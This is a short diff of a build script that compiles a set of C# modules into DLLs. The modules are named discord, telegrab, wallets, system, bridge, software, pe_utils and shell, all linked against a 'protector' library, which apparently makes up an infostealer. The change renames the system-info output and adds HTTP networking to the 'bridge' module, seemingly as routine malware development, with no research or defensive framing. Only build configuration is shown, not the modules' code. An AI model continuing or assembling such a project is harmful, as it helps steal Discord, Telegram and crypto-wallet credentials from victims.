@@ -23,8 +23,8 @@ modules = [
     (NATIVE_DIR, "discord.cs", "discord.dll", "/target:library /r:bin\\protector.dll /r:System.Security.dll"),
     (NATIVE_DIR, "telegrab.cs", "telegrab.dll", "/target:library /r:bin\\protector.dll"),
     (NATIVE_DIR, "wallets.cs", "wallets.dll", "/target:library /r:bin\\protector.dll"),
-    (NATIVE_DIR, "system.cs", "system.dll", "/target:library /r:bin\\protector.dll /r:System.Management.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll /r:System.dll /r:System.Core.dll"),
-    (NATIVE_DIR, "bridge.cs", "bridge.dll", "/target:library /r:bin\\protector.dll"),
+    (NATIVE_DIR, "system.cs", "sysinfo.dll", "/target:library /r:bin\\protector.dll /r:System.Management.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll /r:System.dll /r:System.Core.dll"),
+    (NATIVE_DIR, "bridge.cs", "bridge.dll", "/target:library /r:bin\\protector.dll /r:System.Net.Http.dll /r:System.dll"),
     (NATIVE_DIR, "software.cs", "software.dll", "/target:library /r:bin\\protector.dll /r:System.dll /r:System.Core.dll"),
     (NATIVE_DIR, "pe_utils.cs", "pe_utils.dll", "/target:library /r:bin\\protector.dll"),
     (NATIVE_DIR, "shell.cs", "shell.dll", "/target:library /r:bin\\protector.dll /r:System.dll /r:System.Core.dll")
